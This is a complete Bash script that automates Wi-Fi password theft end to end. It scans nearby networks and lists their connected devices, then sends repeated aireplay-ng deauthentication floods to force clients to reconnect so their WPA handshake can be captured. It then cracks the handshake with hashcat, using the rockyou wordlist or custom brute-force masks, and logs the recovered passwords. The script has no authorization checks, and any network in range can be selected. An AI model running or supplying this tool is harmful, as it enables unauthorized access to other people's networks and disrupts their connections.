#!/bin/bash

# version: 3.4.1 25/1/25 01:04


### FIX ###
# delay between scan to output

### To Do ###
# Add more Hashcat options. l+d, l+u+d. or auto configure combinations. + Add possibilities calc. + show the mask better. + show empty mask at the beginning.
# run all networks or range of them at the same time.
# add more dictioneries than rockyou?
# specific passwords lists for different vendors
# functions to crack PMKID (using hcxpcapngtool..)
# default vendors length (for example: ZTE - 8 capital and numbers) with hashcat
# find attacks for WPA2-WPA3, WPA3


# Start the script while connected to internet in order to download rockyou wordlist if not exist in it's path And OUI file for vendors name of devices and routers (will help identify farther attacks).

# **IMPORTANT** for Alfa AWUS036AXML wifi card:
# 	Don't run apt upgrade. or else the card won't work (I couldn't solve it with the Linux drivers that Alfa offered).
# 	To enable 6Ghz run: "sudo iw reg set US" and reboot. to check if its enabled run: "iw list".


# **IMPORTANT** if we use GPU with Hashcat:
# 	If there is blank screen after installing the GPU drivers on Kali live persistance -
# 	You need to modify the file "/boot/grub/grub.cfg" from different operation system! (on kali the file will be read only):
# 	Add to the end of the kali live entry the word "nomodeset" like that:
# 		menuentry "Live system with USB persistence  (check kali.org/prst)" {
#			linux /live/vmlinuz-6.8.11-amd64 boot=live persistence components quiet splash noeject findiso=${iso_path} persistence nomodeset
#			initrd /live/initrd.img-6.8.11-amd64
# 		}



# ----------------
# Variables
# ----------------
UN=${SUDO_USER:-$(whoami)}
current_date=$(date +"%d_%m_%y")
targets_path="/home/$UN/Desktop/wifi_Targets"
scan_input="$targets_path/Scan/Scan-$current_date.csv"
wordlists_dir="/usr/share/wordlists"
rockyou_file="$wordlists_dir/rockyou.txt"
rockyou_gz="$wordlists_dir/rockyou.txt.gz"
oui_file="$targets_path/oui.txt"
oui_vendor=""


# Ensure required directories exist
mkdir -p "$targets_path"
if [ -d "$targets_path/Scan" ]; then
    rm -rf "$targets_path/Scan"
fi
mkdir "$targets_path/Scan"
touch "$targets_path/wifi_passwords.txt"	    
sudo chown -R $UN:$UN $targets_path




# ------------------------------
# Dependencies Installation
# ------------------------------
function install_dependencies() {
    packages=("aircrack-ng" "gnome-terminal" "wget" "hashcat" "hcxtools" "gawk" "dbus-x11")
    for package in "${packages[@]}"; do
        if ! dpkg -l | grep -q "^ii  $package "; then
            echo -e "\nUpdating the repositories.."
            sudo apt update
            echo "$package is not installed. Installing..."
            sudo apt install -y $package
        fi
    done
}


# ------------------------------
# Check Wordlist and OUI file
# ------------------------------
function check_wordlist() {
    # Check if /usr/share/wordlist directory exists, if not, create it
    if [ ! -d "$wordlists_dir" ]; then
        sudo mkdir -p "$wordlists_dir"
        echo "wordlist folder created"
    fi
    # Check if rockyou.txt exists, if yes, continue code
    if [ -f "$rockyou_file" ]; then
        echo
    else
        # Check if rockyou.gz exists, if yes, unzip it
        if [ -f "$rockyou_gz" ]; then
            echo -e "\n\nrockyou.gz found. Unzipping..."
            sudo gzip -d "$rockyou_gz"
        else
            echo -e "\n\nDownloading the rockyou wordlist file.\n"
            sudo wget -q -P $wordlists_dir https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt 
            wait
        fi
    fi
    
    # Remove passwords less than 8 length from rockyou.txt, because wifi pass is minimum 8 length.
    if [ -f "$wordlists_dir/rockyou-8.txt" ]; then
        :
    else
        echo "Filtering rockyou.txt for 8+ character passwords..."    
        grep -E '^.{8,}$' "$rockyou_file" > "$wordlists_dir/rockyou-8.txt" # Create filtered wordlist (8+ chars only)
        rockyou_file="$wordlists_dir/rockyou-8.txt"
    fi

    # Check if oui.txt exists - for vendors names
    if [ -f "$oui_file" ]; then
        echo
    else
       echo -e "\n\nDownloading OUI file - Vendors detailes.\n"
       wget -q https://raw.githubusercontent.com/Doksy/OUI-list-2025/main/oui.txt -O  "$targets_path"/oui.txt
       wait
    fi         
}


# ------------------------------
# Adapter Configuration
# ------------------------------
function adapter_config() {
	sudo airmon-ng check kill > /dev/null 2>&1   # Kill interfering processes

	# Check known adapters first
	if iwconfig wlan1 &> /dev/null; then
	    wifi_adapter="wlan1"
	elif iw dev wlan1mon info &>/dev/null; then
	    wifi_adapter="wlan1"
	    echo -e "\e[1mWiFi adapter:\e[0m $wifi_adapter \nThe adapter is in monitor mode."
	    return 0    
	elif iwconfig wlan0 &> /dev/null; then
	    wifi_adapter="wlan0"
	elif iw dev wlan0mon info &>/dev/null; then
	    wifi_adapter="wlan0"
	    echo -e "\e[1mWiFi adapter:\e[0m $wifi_adapter \nThe adapter is in monitor mode."
	    return 0
	else
	    # Auto-detect WiFi adapter before asking the user
	    detected_adapter=$(iw dev | awk '$1=="Interface"{print $2}')
	    if [[ -n "$detected_adapter" ]]; then
	        wifi_adapter="$detected_adapter"
	        #echo -e "\e[1mDetected WiFi adapter:\e[0m $wifi_adapter"
	    else
	        read -p "WiFi adapter not detected. Please enter the name of your WiFi adapter: " wifi_adapter
	    fi
	fi  	
	echo -e "\e[1mWiFi adapter:\e[0m $wifi_adapter\nChanging $wifi_adapter to monitor mode"
	sudo airmon-ng start "$wifi_adapter" > /dev/null 2>&1

	# Find the new monitor mode adapter name
	mon_adapter=$(iw dev | awk '/Interface/ && /mon$/ {print $2}')

	if [[ -n "$mon_adapter" ]]; then
		# Extract the original adapter name by removing 'mon' from the end
		wifi_adapter="${mon_adapter%mon}"
	else
		echo -e "\e[31mFailed to start monitor mode. Check your adapter and try again.\e[0m"
		return 1
	fi
}


# ------------------------------
# Network Scanner
# ------------------------------
function network_scanner() {	
        # Scan 15 seconds for wifi networks   
        countdown_duration=3
        sudo gnome-terminal --geometry=110x35-10000-10000 -- bash -c "sudo timeout ${countdown_duration}s airodump-ng --band abg ${wifi_adapter}mon --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date"        

        echo -e "\n\n\e[1;34mScanning available WiFi Networks ($countdown_duration s):\e[0m"
        for (( i=$countdown_duration; i>=1; i-- )); do
            tput cuu1 && tput el
            echo -e "\e[1;34mScanning for available WiFi Networks:\033[1;31m\033[1m $i \033[0m"
            sleep 1
        done
        mv $targets_path/Scan/Scan-$current_date-01.csv $scan_input
        cp "$scan_input" "$scan_input.original"
        
	# Extract client MAC and associated BSSID from the original scan without displaying them
	clients_content=$(awk -F, '/Station MAC/ {flag=1; next} flag && $1 ~ /:/ {client_mac=$1; bssid=$6; if (bssid !~ /(not associated)/) printf "%-22s %s\n", client_mac, bssid}' "$scan_input.original")

	# Edit original scan file to a more organized format
	awk -F, 'BEGIN {OFS=","} {print $1, $4, $6, $9, $14}' "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input" # Extract relevant fields
	awk '/^Station MAC,/ {print; exit} {print}' "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"           # Delete the clients part
	awk -F',' '$NF ~ /\S/' "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"                                # Delete networks without names
	tail -n +2 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"                                            # Remove the header
	head -n -1 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"                                            # Remove the footer
	awk -F, '{ gsub(/^ */, "", $0); gsub(/ *$/, "", $0); print $0 }' "$scan_input" | sort -t, -k4,4nr -k5 > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input" # Sort by power and name

	# Append the client information to the end of the scan file
	echo -e "\nStation MAC:            BSSID:\n$clients_content" >> "$scan_input"

	# Display available WiFi networks
	echo -e "\n\033[1;33mAvailable WiFi Networks:\033[0m\n"

	# Display the scan input file contents with row numbers
	printf "\033[1m      Name: %-30s Clients: %-1s Encryption: %-3s Channel: %-1s Power: %-1s Signal: %-0s BSSID: %-13s Vendor: %-1s\033[0m\n"
	echo "--------------------------------------------------------------------------------------------------------------------------------------------------"

	declare -A client_counts
	while IFS= read -r client_line; do
	    bssid=$(echo "$client_line" | awk '{print $2}')
	    # Ensure bssid is not empty before incrementing
	    if [[ -n "$bssid" ]]; then
		((client_counts["$bssid"]++))
	    fi
	done <<< "$clients_content"

	# Process and display only the WiFi network section (exclude the Station MAC section)
	awk '/^Station MAC/ {exit} {print}' "$scan_input" | nl -w2 -s', ' | awk -F', ' '{print $0}' | while read -r line; do
	    # Skip empty lines
	    if [[ -z "$line" ]]; then
		continue
	    fi
	    index=$(echo "$line" | cut -d',' -f1 | xargs)
	    mac=$(echo "$line" | cut -d',' -f2 | xargs)
	    channel=$(echo "$line" | cut -d',' -f3 | xargs)
	    encryption=$(echo "$line" | cut -d',' -f4 | xargs)
	    power=$(echo "$line" | cut -d',' -f5 | xargs)
	    ssid=$(echo "$line" | cut -d',' -f6 | tr -d '|')  # remove "|" from SSID name

	    # Get the vendor dynamically
	    vendor=$(get_oui_vendor "$mac")
	    # Get the number of clients for this BSSID
	    client_count=${client_counts["$mac"]}
	    clients_display=""
	    if [[ -n "$client_count" ]]; then
		clients_display="+$client_count"
	    fi
	      
	    # Convert dBm power values into signal bars representation
	    signal_strength=$power  # Assuming power is in dBm (negative values)
    	    if (( signal_strength >= -60 )); then
	        bars="\e[1;32m▂▄▆█\e[0m"  # Excellent
	    elif (( signal_strength >= -70 )); then
	        bars="\e[1;33m▂▄▆_\e[0m"  # Good 
	    elif (( signal_strength >= -80 )); then
	        bars="\e[1;35m▂▄__\e[0m"  # Fair
	    elif (( signal_strength >= -90 )); then
	        bars="\e[1;36m▂___\e[0m"  # Weak 
	    else
	        bars="\e[1;31m____\e[0m"  # Very Weak 
	    fi

	    # Use printf to format the fields and pipe into column for proper alignment
	    if [[ -n "$vendor" ]]; then
		printf "%-4s %-35s | %-7s | %-12s | %-7s | %-5s | %-5b | %-17s | %-1s\n" \
		    "$index." "$ssid" "$clients_display" "$encryption" "$channel" "$power" "$bars" "$mac" "$vendor"
	    else
		printf "%-4s %-35s | %-7s | %-12s | %-7s | %-5s | %-5b | %-17s\n" \
		    "$index." "$ssid" "$clients_display" "$encryption" "$channel" "$power" "$bars" "$mac"
	    fi
	done | column -t -s "|"
	echo
        
        num_rows=$(awk '/Station MAC/ {exit} NF {count++} END {print count}' "$scan_input") # Calculate the number of valid rows (above the empty line before "Station MAC")
		    	    
        choose_network
}


# ------------------------------
# Choose Network
# ------------------------------
function choose_network() {
    while :; do
        # Prompt the user to choose a row number
        read -p "Enter row number: " row_number
        echo
        # Keep asking for a valid row number
        while :; do
            re='^[0-9]+$'
            if ! [[ $row_number =~ $re ]]; then
                echo -e "\033[1;31m\033[1m\nError:\033[0m Not a valid number."
            elif (( row_number < 1 || row_number > num_rows )); then
                echo -e "\033[1;31m\033[1m\nError:\033[0m Row number out of range."
            else
                break
            fi
            echo
            read -p "Enter row number: " row_number
            echo
        done

        # Extracting values from airodump-ng scan file
        chosen_row=$(awk -v row="$row_number" 'NR == row' "$scan_input")
        bssid_address=$(echo "$chosen_row" | awk -F', ' '{print $1}')
        channel=$(echo "$chosen_row" | awk -F', ' '{print $2}')
        encryption=$(echo "$chosen_row" | awk -F', ' '{print $3}')
        power=$(echo "$chosen_row" | awk -F', ' '{print $4}')
        bssid_name=$(echo "$chosen_row" | awk -F', ' '{print $5}')
        bssid_name_original=${bssid_name}

        # Remove "/" from bssid name
        if [[ $bssid_name == *"/"* ]]; then
            bssid_name=${bssid_name//\//}
        fi

        oui_vendor=$(get_oui_vendor)

        # Echo values
        echo -e "\033[1;31m\033[1mBSSID Name:\033[0m $bssid_name_original"
        if [[ -n "$oui_vendor" ]]; then
            echo -e "\033[1;31m\033[1mMAC Address:\033[0m $bssid_address - $oui_vendor"
        else
            echo -e "\033[1;31m\033[1mMAC Address:\033[0m $bssid_address"
        fi

        if [ "$encryption" = "OPN" ]; then
            echo -e "\033[1;31m\033[1mEncryption:\033[0m none"
        else
            echo -e "\033[1;31m\033[1mEncryption:\033[0m $encryption"
        fi
        echo -e "\033[1;31m\033[1mChannel:\033[0m $channel"
        echo -e "\033[1;31m\033[1mPower:\033[0m $power"        
        echo
        echo

        if [ "$encryption" = "OPN" ]; then
            echo -e "\033[1mThe Network is open.\033[0m"
            echo -e "Choose different Network.\n"
            continue  
        elif [[ "$encryption" == *WPA3* ]]; then
            echo -e "\033[1mThe encryption is "$encryption". This script can't crack it yet.\033[0m"
            echo -e "Choose different Network.\n"
            continue 
        fi

        # Check if we already have the Wi-Fi password for this BSSID
        if sudo grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep -q "The wifi password is:"; then
            wifi_password=$(sudo grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep "The wifi password is:" | awk -F': ' '{print $2}' | xargs)
            echo -e "\033[1;32mPassword already exists for this network!\033[0m"
            echo -e "\033[1;34mThe Wi-Fi password is:\033[0m \033[1;33m$wifi_password\033[0m\n"
            echo -e "Choose different Network.\n"
            continue 
        fi

        # Check if this BSSID was previously marked as failed with Rockyou wordlist   
        if grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep -q "Password not cracked with Rockyou wordlist"; then
            echo -e "\033[1;34mPassword for $bssid_name (BSSID: $bssid_address)\033[0m was already checked and \033[1;31mnot found in Rockyou wordlist.\033[0m\n" 
            echo -e "Choose different Attack..\n"
            choose_password_attack
            #continue 
        fi

        # If we only captured the handshake from previous scan
        if [ -d "$targets_path/$bssid_name" ]; then
            if sudo grep -q "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt"; then
                echo -e "\033[1;32mHandshake found from previous scan.\033[0m\n"
                sudo pkill aireplay-ng
                sudo pkill airodump-ng
                cleanup
                choose_password_attack
                exit 1   
            else
                rm -r $targets_path/"$bssid_name" 
                mkdir $targets_path/"$bssid_name"           
            fi   
        else
            mkdir $targets_path/"$bssid_name"           
        fi

        validate_network
        break  # Exit the loop once a valid network is chosen
    done
}


# ------------------------------
# Validate Network
# ------------------------------
function validate_network() {
    echo -e "\e[1mValidating network:\e[0m"
    
    # Open airodump-ng in a hidden terminal
    gnome-terminal --geometry=105x15-10000-10000 -- script -c "sudo airodump-ng --band abg -c $channel -w '$targets_path/$bssid_name/$bssid_name' -d $bssid_address $wifi_adapter"mon"" "$targets_path/$bssid_name/airodump_output.txt"

    found=0
    echo -n "Checking"
    
    for (( i=0; i<15; i++ )); do
        if [ "$(grep -c "$bssid_address" "$targets_path/$bssid_name/airodump_output.txt")" -ge 2 ]; then
            found=1
            echo -e "\n\e[1;32mNetwork available!\e[0m"
            break
        fi
        echo -n "."  # Show progress dots
        sleep 1
    done

    echo ""  # New line after dots

    if [ $found -eq 0 ]; then
        sudo pkill aireplay-ng
        sudo pkill airodump-ng
        echo -e "\e[1;31mNetwork appears to be offline now.\e[0m"
        another_scan_prompt
    fi
}



# ------------------------------------
# Get the vendors names of the devices
# ------------------------------------
function get_oui_vendor() {
    local mac="$1"
    # If no argument is provided, use the global variable bssid_address
    if [[ -z "$mac" ]]; then
        mac="$bssid_address"
    fi
    local oui=$(echo "$mac" | awk -F':' '{print toupper($1 ":" $2 ":" $3)}') # Extract OUI in uppercase
    if [[ -f $oui_file ]]; then
        local vendor=$(grep -i "^$oui" "$oui_file" | awk '{$1=""; print $0}' | xargs | tr -d '\r')
        echo "$vendor"
    else
        echo ""
    fi
}


# ------------------------------
# Dvices Scanner
# ------------------------------
function devices_scanner() {
    echo -e "\e[1m\nStart scanning for devices ->>\e[0m"

    duration=60  # Set countdown time (seconds)
    
    while [ $duration -gt 0 ]; do
        target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")

        if [ -n "$target_devices" ]; then
            # Print Devices_Found with vendor names
            echo -e "\n\n\033[1;33mDevices Found:\033[0m" 
            echo -e "$target_devices" | tr ' ' '\n' | while read -r mac; do
                if [[ -n "$mac" ]]; then
                    vendor=$(get_oui_vendor "$mac")
                    if [[ -n "$vendor" ]]; then
                        echo -e "$mac - $vendor"
                    else
                        echo -e "$mac"
                    fi
                fi
            done		
            echo
            break
        fi

        # Convert remaining seconds into MM:SS format
        minutes=$((duration / 60))
        seconds=$((duration % 60))
        printf "\r\e[1;34m%02d:%02d\e[0m Scanning for devices.." "$minutes" "$seconds"

        # Check if handshake is found
        if sudo grep -q "WPA handshake: $bssid_address" "$targets_path/$bssid_name/airodump_output.txt"; then
            echo -e "\033[1;32m\n->> Got the handshake!\033[0m\n"
            sudo pkill aireplay-ng
            sudo pkill airodump-ng
            echo
            echo --- >> "$targets_path/wifi_passwords.txt"
            printf "We got handshake for (%s): %-40s at %s\n" "$bssid_address" "$bssid_name" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
            cleanup
            choose_password_attack
        fi

        sleep 1
        ((duration--))
    done

    # Clear the countdown timer after scanning finishes
    echo -ne "\r                                      \r"

    if [ -z "$target_devices" ]; then
        echo -e "\033[1m\nNo device were found.\033[0m"
        sudo pkill airodump-ng
        rm -r "$targets_path/$bssid_name"
        another_scan_prompt
    fi
    sleep 2
}


# ------------------------------
# Deauth Attack  
# ------------------------------
function deauth_attack() {
	    echo -e "\033[1;31m\033[1mStarting deauth attack ->>\033[0m"
	    # trying 10 times (1 minutes) the deauth attack
	    counter=10
	    for ((i=1; i<=$counter; i++)); do        
		target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")		

		gnome-terminal --geometry=78x4-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 1000 -a "$bssid_address" "$wifi_adapter"mon
		
		echo -e "Attempt \e[1;34m$i/$counter\e[0m to capture handshake of:"         			
		# Print MAC addresses with vendor names
		echo -e "$target_devices" | tr ' ' '\n' | while read -r mac; do
		    if [[ -n "$mac" ]]; then
			# Call the function to get the vendor
			vendor=$(get_oui_vendor "$mac")
			# Print the MAC with its vendor
			if [[ -n "$vendor" ]]; then
			    echo "$mac - $vendor"
			else
			    echo "$mac"
			fi
		    fi
		done	
		echo
		# waiting 9 sec after deauth attack while looking for handshake:
		for ((j=1; j<=9; j++)); do
		    sleep 1
		    if sudo grep -q "WPA handshake: $bssid_address" "$targets_path/$bssid_name/airodump_output.txt"; then
		        echo -e "\033[1;32m->> Got the handshake!\033[0m\n"
		        sudo pkill aireplay-ng
			sudo pkill airodump-ng
			echo
			echo --- >> $targets_path/wifi_passwords.txt
			printf "We got handshake for (%s): %-40s at %s\n" "$bssid_address" "$bssid_name" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
			break 2
		    fi    
		done
	    # after 10 unseccessfull attempts, quit the script:
	    if [ "$i" == "$counter" ]; then
	    	echo -e "\033[1m\nNo handshake obtained within 1.5 minutes. Try again.\033[0m"
	    	sudo pkill aireplay-ng
		sudo pkill airodump-ng
		rm -r $targets_path/"$bssid_name"
		another_scan_prompt
	    fi
	    done       
}


# -------------------------
# Dictionary Attack
# -------------------------
function dictionary_attack() {

    hcxpcapngtool -o "$targets_path/$bssid_name/hash.hc22000" "$targets_path/$bssid_name/$bssid_name-01.cap" > /dev/null 2>&1
	
    echo -e "\e[1m\nCracking wifi password with rockyou wordlist ->>\n\e[0m"
    gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c "hashcat -m 22000 -a 0 "$targets_path/$bssid_name/hash.hc22000" $rockyou_file --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --force --optimized-kernel-enable --status --status-timer=5 --potfile-disable"

    echo
    if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
        wifi_pass=$(grep "$bssid_name_original" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name_original:" '{print $2}')
        echo -e "\033[1;34mThe wifi password of\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m	\033[1;33m$wifi_pass\033[0m"
        bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The wifi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
        rm -r $targets_path/"$bssid_name" 
        exit 1
    else
        echo -e "\n\033[1;31m\033[1mCouldn't crack with the Rockyou wordlist..\033[0m\n"
        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not cracked with Rockyou wordlist" "$targets_path/wifi_passwords.txt"
        echo
	read -p "Do you want to run a Brute-Force attack (Y/n)? " choice
	case $choice in
	    y|Y)
		brute-force_attack
		;;
	    n|N)
		another_scan_prompt
		;;
	    *)
		echo "Invalid choice. Please enter 'y' or 'n'."
		;;
	esac        
    fi
}


# ------------------------------
# Brute-Force attack
# ------------------------------
function brute-force_attack() {

    hcxpcapngtool -o "$targets_path/$bssid_name/hash.hc22000" "$targets_path/$bssid_name/$bssid_name-01.cap" > /dev/null 2>&1
    echo -e "\e[1m\nCracking WiFi password with Hashcat ->>\e[0m\n"
    
    # Ask user for password length
    while true; do
        read -p "Enter password length (Wi-Fi min: 8): " password_length

        # If the user presses Enter, set password_length to 8
        if [[ -z "$password_length" ]]; then
            password_length=8
            echo "default is 8"
            break
        fi

        # Validate password length
        if [[ "$password_length" =~ ^[0-9]+$ ]] && [[ "$password_length" -gt 0 ]]; then
            break
        else
            echo "Invalid password length. Please enter a positive number."
        fi
    done

    # Ask user if they want to try every possible combination or customize each position
    while true; do
        full_mask=""

        echo -e "\n\e[1mChoose how to run the Brute-Force:\e[0m"
        echo -e "1) Try every possible combination           (ABC-abc-123-!@#)   |   $password_length^94 possibilities.\n"
        echo -e "2) Customize each position of the password:"
        echo "   1. Uppercase                    ?u   -   (ABC)"
        echo "   2. Lowercase                    ?l   -   (abc)"
        echo "   3. Numbers                      ?d   -   (123)"
        echo "   4. Special character            ?s   -   (!@#)"
        echo "   5. Uppercase + Numbers          ?1   -   (ABC-123)"
        echo "   6. All character types          ?a   -   (ABC-abc-123-!@#)"
        echo "   7. Enter a specific character:  __"
        echo -e "\n"

        read -p "Enter your choice (1-2): " option

        if [[ "$option" -eq 1 ]]; then
            echo -e "\nWe will check all possible characters (ABC-abc-123-!@#) for each position."
            char_set="?a"

            # Generate the full mask
            for (( i=0; i<password_length; i++ )); do
                full_mask+="$char_set"
            done
            break
        elif [[ "$option" -eq 2 ]]; then
            positions=()
            for (( i=1; i<=password_length; i++ )); do
                tput cuu1; tput el; tput cuu1; tput el;
                echo -n -e "\e[1mCurrent mask:\e[0m "
                for pos in "${positions[@]}"; do
                    echo -n -e "\e[1;36m[\e[0m \e[1;31m$pos\e[1;36m \e[1;36m]\e[0m "
                done
                echo

                while true; do
                    read -p "Choose an option for position $i/$password_length  (Choose 1-7): " choice
                    case "$choice" in
                        1) positions+=("?u"); break;; 
                        2) positions+=("?l"); break;; 
                        3) positions+=("?d"); break;;
                        4) positions+=("?s"); break;;
                        5) positions+=("?1"); charset="-1 ?u?d"; break;;  
                        6) positions+=("?a"); break;;                                                                                     
                        7) 
                            while true; do
                                read -p "  Enter the specific character for position $i: " specific_char
                                if [[ ${#specific_char} -eq 1 ]]; then
                                    positions+=("$specific_char")
                                    tput cuu1; tput el; tput cuu1; tput el; tput cuu1; tput el;
                                    echo -n "Current mask: "
                                    for pos in "${positions[@]}"; do
                                        echo -n -e "\e[1;36m[\e[0m \e[1;31m$pos\e[1;36m \e[1;36m]\e[0m "
                                    done
                                    echo
                                    ((i++))
                                    break
                                else
                                    tput cuu1; tput el; tput cuu1; tput el;
                                    echo -e "\e[1;31mInvalid input!\e[0m Please enter exactly ONE character."
                                fi
                            done
                            ;;
                        *) echo "Invalid choice. Please enter a valid option."
                           tput cuu1; tput el; tput cuu1; tput el;;
                    esac
                done
            done
            full_mask=$(IFS=; echo "${positions[*]}")
            break 
        else
            echo "Invalid option. Please enter 1-2."
        fi
    done

    echo -e "\n\n\033[1;33mGenerated Hashcat mask:\033[0m \033[1;31m\033[1m$full_mask\033[0m\n\n"

    # Run hashcat with the correct options
    if [[ -n "$charset" ]]; then
        gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c "hashcat -a 3 -m 22000 "$targets_path/$bssid_name/hash.hc22000" $charset "$full_mask" --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --force --optimized-kernel-enable --status --status-timer=5 --potfile-disable" 
    else
        gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c "hashcat -a 3 -m 22000 "$targets_path/$bssid_name/hash.hc22000" "$full_mask" --outfile "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" --force --optimized-kernel-enable --status --status-timer=5 --potfile-disable" 
    fi
           
    echo
    if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
        wifi_pass=$(grep "$bssid_name_original" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name_original:" '{print $2}')
        echo -e "\033[1;34mThe wifi password of\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m	\033[1;33m$wifi_pass\033[0m"
        bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The wifi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
        rm -r $targets_path/"$bssid_name" 
        exit 1
    else
        echo -e "\n\033[1;31m\033[1mCouldn't cracked with Brute-Force with this masking: $full_mask\033[0m\n"
        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a Password not cracked with Brute-Force of this masking: $full_mask" "$targets_path/wifi_passwords.txt"
        echo
	read -p "Do you want to run a dictionary attack (Y/n)? " choice
	case $choice in
	    y|Y)
		dictionary_attack
		;;
	    n|N)
		another_scan_prompt
		;;
	    *)
		echo "Invalid choice. Please enter 'y' or 'n'."
		;;
	esac        
    fi
}


# -----------------
# Enable GPU
# -----------------
function enable_gpu() {
    # Check if running in a VM
    if [[ -n "$(systemd-detect-virt)" && "$(systemd-detect-virt)" != "none" ]]; then
        echo -e "\nYou are running inside a virtual machine. GPU acceleration may not be available."
        return 1
    fi

    # Detect GPU
    GPU_INFO=$(lspci -nn | grep -i 'vga\|3d' | grep -i 'nvidia')

    if [[ -z "$GPU_INFO" ]]; then
        echo -e "\n\e[1;31mNo NVIDIA GPU detected. Skipping GPU setup.\e[0m"
        return 1
    fi

    # Extract GPU model
    GPU_MODEL=$(echo "$GPU_INFO" | sed -E 's/.*\[(GeForce [^]]+)\].*/\1/')
    echo -e "GPU detected: \e[1;32mNVIDIA $GPU_MODEL\e[0m"

    # Check for CUDA
    if command -v nvidia-smi &>/dev/null; then
        CUDA_VERSION=$(nvidia-smi | grep -i "CUDA Version" | awk '{print $6}')
        echo -e "CUDA is installed. Version: \e[1;34m$CUDA_VERSION\e[0m"
    else
        echo -e "\nCUDA is not detected."
        read -p "Would you like to install CUDA? (Y/n): " response
        if [[ "$response" =~ ^[Yy]$ ]]; then
            echo -e "\nInstalling NVIDIA CUDA drivers..."
	    packages=("linux-headers-amd64" "nvidia-driver" "nvidia-cuda-toolkit")
	    for package in "${packages[@]}"; do
		    if ! dpkg -l | grep -q "^ii  $package "; then
		        echo -e "\nInstalling $package..."
		        sudo apt install -y "$package"
		    else
		        echo -e "✅ $package is already installed."
		    fi
	    done                        
            echo -e "\n\e[1;33mPlease reboot your system for changes to take effect.\e[0m"
            return 0
        else
            echo -e "\nSkipping CUDA installation. GPU will not be used."
            return 1
        fi
    fi
    # Check if Hashcat detects the GPU
    HASHCAT_INFO=$(hashcat -I | grep GPU 2>/dev/null)
    if [[ -n "$HASHCAT_INFO" ]]; then
        echo -e "Great! Hashcat detects the GPU and will use it.\n\n"
        return 0
    else
        echo -e "\nHashcat does not detect the GPU."
        echo -e "Possible reasons:\n   - Missing NVIDIA drivers\n   - OpenCL not installed\n   - CUDA not properly configured"
        echo -e "\nSkipping GPU setup."
    fi
}


# ------------------------------
# Retry Prompt
# ------------------------------
function another_scan_prompt() {
    while true; do
        echo
        read -p "Do you want to run another scan? (Y/n): " answer
        echo
        case $answer in
            [Yy]* )
                main_process
                break ;;
            [Nn]* )
                echo -e "\nBye."
                cleanup
                exit 1 ;;
            * )
                echo "Invalid input. Please answer yes or no (Y/n)."
                ;;
        esac
    done
}


# ------------------------------
# Cleanup
# ------------------------------
function cleanup() {
	sudo chown -R $UN:$UN $targets_path
	gnome-terminal --geometry=1x1-10000-10000 -- sudo airmon-ng stop "$wifi_adapter"mon
	gnome-terminal --geometry=1x1-10000-10000 -- sudo systemctl start NetworkManager
}


# ------------------------------
# Choose Password Attack
# ------------------------------
function choose_password_attack() {
	while true; do
	    echo -e "\n\033[1;33mChoose how to crack the password:\e[0m"
	    echo "1) Dictionary attack (Rockyou wordlist)"
	    echo "2) Brute-Force attack"
	    read -p "Enter your choice: " choice
	    echo

	    case $choice in
		1)
		    dictionary_attack
		    ;;
		2)
		    brute-force_attack
		    ;;
		*)
		    echo "Invalid choice. Please select 1 or 2."
		    ;;
	    esac
	done
}



# ------------------------------
# Main Process
# ------------------------------
function main_process() {
	adapter_config
	network_scanner
	devices_scanner
	deauth_attack
	cleanup
	choose_password_attack
}

install_dependencies
check_wordlist
enable_gpu
main_process





